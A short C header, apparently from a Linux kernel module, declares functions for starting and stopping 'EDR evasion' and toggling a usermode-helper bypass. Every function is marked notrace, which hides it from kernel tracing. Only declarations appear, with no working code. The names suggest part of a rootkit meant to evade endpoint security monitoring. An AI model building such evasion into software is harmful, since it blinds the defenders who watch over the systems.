#ifndef UB_EDR_EVADE_H
#define UB_EDR_EVADE_H

notrace int ub_edr_evade_start(void);
notrace void ub_edr_evade_stop(void);
notrace bool ub_edr_engaged(void);
notrace void ub_umh_bypass_on(void);
notrace void ub_umh_bypass_off(void);

#endif
